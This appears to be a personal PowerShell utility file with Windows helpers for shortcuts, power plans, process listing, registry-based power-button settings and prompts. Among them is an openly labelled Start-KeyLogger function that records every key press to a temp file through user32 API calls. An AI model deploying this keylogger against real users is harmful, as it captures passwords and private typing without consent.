function Get-ExecutableForFile
{
		param
		(
				[Parameter(Mandatory)]
				[string]
				$Path
		)
 
		$Source = @"
 
using System;
using System.Text;
using System.Runtime.InteropServices;
public class Win32API
		{
				[DllImport("shell32.dll", EntryPoint="FindExecutable")] 
 
				public static extern long FindExecutableA(string lpFile, string lpDirectory, StringBuilder lpResult);
 
				public static string FindExecutable(string pv_strFilename)
				{
						StringBuilder objResultBuffer = new StringBuilder(1024);
						long lngResult = 0;
 
						lngResult = FindExecutableA(pv_strFilename, string.Empty, objResultBuffer);
 
						if(lngResult >= 32)
						{
								return objResultBuffer.ToString();
						}
 
						return string.Format("Error: ({0})", lngResult);
				}
		}
 
"@ 
 
		Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
		[Win32API]::FindExecutable($Path)
}

<#
.SYNOPSIS
		Sets a shortcut for exe file.
.PARAMETER SourceExe
		The known exe file path.
.PARAMETER ArgumentsToSourceExe
		The arguments.
.PARAMETER DestinationPath
		Shortcut location.
#>
function Set-Shorcut
{
	Param (
				[string]$SourceExe,
				[string]$ArgumentsToSourceExe,
				[string]$DestinationPath
		)
	$WshShell = New-Object -comObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut($DestinationPath)
	$Shortcut.TargetPath = $SourceExe
	$Shortcut.Arguments = $ArgumentsToSourceExe
	$Shortcut.Save()
}

function Set-PowerMode
{
	Param
	(
		[Parameter(Mandatory = $true,Position = 0)] 
		[ValidateSet("Power saver", "Balanced", "High performance")]
		[String]$PowerMode
	)
	$pac = gwmi -NS root\cimv2\power -Class win32_PowerPlan | select ElementName, IsActive | where {$_.IsActive}
	if($pac.ElementName -ne $PowerMode)
	{
		$paca = gwmi -NS root\cimv2\power -Class win32_PowerPlan -Filter "ElementName ='$PowerMode'"
		if($paca)
		{
			$paca.Activate();
		}

				#$p = Get-CimInstance -Name root\cimv2\power -Class win32_PowerPlan -Filter "ElementName = 'High Performance'"
				#Invoke-CimMethod -InputObject $p -MethodName Activate
	}
}

function IsModulesExists
{
	$result = $true
	$modules = @(<#"Pscx",#> "Agt.Powershell", "Agt.Common"	)
	#$var = (Get-Module | measure).Count
	foreach($value in $modules)	{ if (!(Get-Module -Name $value)){ $result = $false; break; } }
	$result
}
function Start-Fun
{
		$null = Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName "SessionSwitch" -Action {
		Add-Type -AssemblyName System.Speech
		$synthesizer = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
		switch($event.SourceEventArgs.Reason) {
				'SessionLock'    { $synthesizer.Speak("Seeyou later $env:username!") }
				'SessionUnlock'  { $synthesizer.Speak("Hey,welcome back $env:username!") }
		}
	}
}

function Stop-Fun
{
		$events = Get-EventSubscriber | Where-Object { $_.SourceObject -eq [Microsoft.Win32.SystemEvents] }
		$jobs = $events | Select-Object -ExpandProperty Action
		$events | Unregister-Event
		$jobs | Remove-Job
}

function Start-Progress
{
	param
	(
		[ScriptBlock]
		$code
	)

	$newPowerShell = [PowerShell]::Create().AddScript($code)
	$handle = $newPowerShell.BeginInvoke()  

	while ($handle.IsCompleted -eq $false)
	{
		Write-Host '.' -NoNewline
		Start-Sleep -Milliseconds 500
	}

	Write-Host ''  

	$newPowerShell.EndInvoke($handle)  

	$newPowerShell.Runspace.Close()
	$newPowerShell.Dispose()
}

function Test
{
	$codetext = $Args -join ' '
	$codetext = $ExecutionContext.InvokeCommand.ExpandString($codetext)
	$code = [ScriptBlock]::Create($codetext)
	$timespan = Measure-Command $code
	"Your code took {0:0.000} seconds to run" -f $timespan.TotalSeconds
} 

function Export-ScheduledTask
{
		param
		(
				[Parameter(Mandatory=$true)]
				$TaskName,
				[Parameter(Mandatory=$true)]
				$XMLFileName
		)

		schtasks /QUERY /TN $TaskName /XML | Out-File $XMLFileName
}

function Get-ProcessEx
{
		param
		(
				$Name='*',           
				$ComputerName,            
				$Credential
		)

		$null = $PSBoundParameters.Remove('Name')
		$Name = $Name.Replace('*','%')      

		Get-WmiObject -Class Win32_Process @PSBoundParameters -Filter "Name like '$Name'" |
		ForEach-Object
		{
				$result = $_ | Select-Object Name, Owner, Description, Handle
				$Owner = $_.GetOwner()
				if ($Owner.ReturnValue -eq 2)
				{
						$result.Owner = 'AccessDenied'
				} else
				{
						$result.Owner = '{0}\{1}' -f ($Owner.Domain, $Owner.User)
				}
				$result
		}
}

function Get-OSVersion
{

 $signature = @"

 [DllImport("kernel32.dll")]

 public static extern uint GetVersion();

"@
Add-Type -MemberDefinition $signature -Name "Win32OSVersion" -Namespace Win32Functions -PassThru
}

#$os = [System.BitConverter]::GetBytes((Get-OSVersion)::GetVersion())
#$majorVersion = $os[0]

#$minorVersion = $os[1]
#$build = [byte]$os[2],[byte]$os[3]

#$buildNumber = [System.BitConverter]::ToInt16($build,0)
#"Version is {0}.{1} build {2}" -F $majorVersion,$minorVersion,$buildNumber

<#
The sample scripts are not supported under any Microsoft standard support 
program or service. The sample scripts are provided AS IS without warranty  
of any kind. Microsoft further disclaims all implied warranties including,  
without limitation, any implied warranties of merchantability or of fitness for 
a particular purpose. The entire risk arising out of the use or performance of  
the sample scripts and documentation remains with you. In no event shall 
Microsoft, its authors, or anyone else involved in the creation, production, or 
delivery of the scripts be liable for any damages whatsoever (including, 
without limitation, damages for loss of business profits, business interruption, 
loss of business information, or other pecuniary loss) arising out of the use 
of or inability to use the sample scripts or documentation, even if Microsoft 
has been advised of the possibility of such damages.
#> 

Function Set-OSCPowerButtonAction
{
	Param
	(
		[Parameter(Mandatory = $true,Position = 0)] 
		[ValidateSet("LogOff", "SwitchUser", "Lock","Restart","Sleep","Hibernate","ShutDown")]
		[String]$Action
	)
	Switch($Action)
	{
		"SwitchUser"  	{	ChangebuttonAction 0x00000100 	}
		"LogOff"    	{	ChangebuttonAction 0x00000001	}
		"Lock" 			{	ChangebuttonAction 0x00000200	}
		"Restart" 		{	ChangebuttonAction 0x00000004	}
		"Sleep" 		{	ChangebuttonAction 0x00000010	}
		"Hibernate" 	{	ChangebuttonAction 0x00000040	} 
		"Shutdown" 		{	ChangebuttonAction 0x00000002 	}
	}
	#GetChoice
}


function ChangebuttonAction($value)
{
	$Regpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
	$KetExist = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_PowerButtonAction" -ErrorAction SilentlyContinue
	If($KetExist)
	{
	
		Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  -Name "Start_PowerButtonAction"  -Value $value 
	}
	Else 
	{
		New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  -Name "Start_PowerButtonAction"  -Value $value  -PropertyType Dword
	}
}

function PromptGetChoice
{
		#Prompt message
		$Caption = "Restart the computer."
		$Message = "It will take effect after restart, do you want to restart right now?"
		$Choices = [System.Management.Automation.Host.ChoiceDescription[]]`
		@("&Yes","&No")
		[Int]$DefaultChoice = 0
		$ChoiceRTN = $Host.UI.PromptForChoice($Caption, $Message, $Choices, $DefaultChoice)
		Switch ($ChoiceRTN)
		{
				0 	{shutdown -t 0 -r }
				1  	{break}
		}
}

function PromptInfo
{
	param(  [string]$message	)
	$Caption = "Attention"
	if(!($message)){		$message = "Info" }
	#$Choices = [System.Management.Automation.Host.ChoiceDescription[]] @("&Yes","&No")
	$Choices = [System.Management.Automation.Host.ChoiceDescription[]] @("&Ok")
	[Int]$DefaultChoice = 0
	$ChoiceRTN = $Host.UI.PromptForChoice($Caption, $Message, $Choices, $DefaultChoice)
}

#requires -Version 2 
function Show-InputBox
{
		[CmdletBinding()]
		param
		(
				[Parameter(Mandatory=$true)]
				[string]
				$Prompt,
				
				[Parameter(Mandatory=$false)]
				[string]
				$DefaultValue='',
				
				[Parameter(Mandatory=$false)]
				[string]
				$Title = 'Windows PowerShell'
		)
		
		
		Add-Type -AssemblyName Microsoft.VisualBasic
		[Microsoft.VisualBasic.Interaction]::InputBox($Prompt,$Title, $DefaultValue)
}
 
#Show-InputBox -Prompt 'Enter your name'

function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
	# Signatures for API Calls
	$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@ 
 
	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
		
	# create output file
	$null = New-Item -Path $Path -ItemType File -Force
 
	try
	{
		Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
		# create endless loop. When user presses CTRL+C, finally-block
		# executes and shows the collected key presses
		while ($true) {
			Start-Sleep -Milliseconds 40
			
			# scan all ASCII codes above 8
			for ($ascii = 9; $ascii -le 254; $ascii++) {
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)
 
				# is key pressed?
				if ($state -eq -32767) {
					$null = [console]::CapsLock
 
					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)
 
					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)
 
					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder
 
					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
					if ($success) 
					{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
					}
				}
			}
		}
	}
	finally
	{
		# open logger file in Notepad
		notepad $Path
	}
}
 
# records all key presses until script is aborted by pressing CTRL+C 
# will then open the file with collected key codes 
#Start-KeyLogger 

function Clear-MusicFolderFromPlayLists
{
	[CmdletBinding()]
	Param
	(
		[Parameter(mandatory=$true,ValueFromPipeline=$true)]
		[ValidateSet('D:\\music')]
		[string]$MusicFolderPath
	)
	Process 
	{
		$playlistsfolder = [System.IO.Path]::Combine($MusicFolderPath, "\\Playlists")
		$templists = Get-ChildItem -Recurse -Path $MusicFolderPath | Where-Object { ($_.Extension -eq ".m3u") -and ($_.FullName  -notmatch $playlistsfolder)}
	foreach ($row in $templists)
	{
			#$row.FullName
		Remove-Item  -LiteralPath $row.FullName -Force -ErrorAction SilentlyContinue -Verbose
	}
	}
}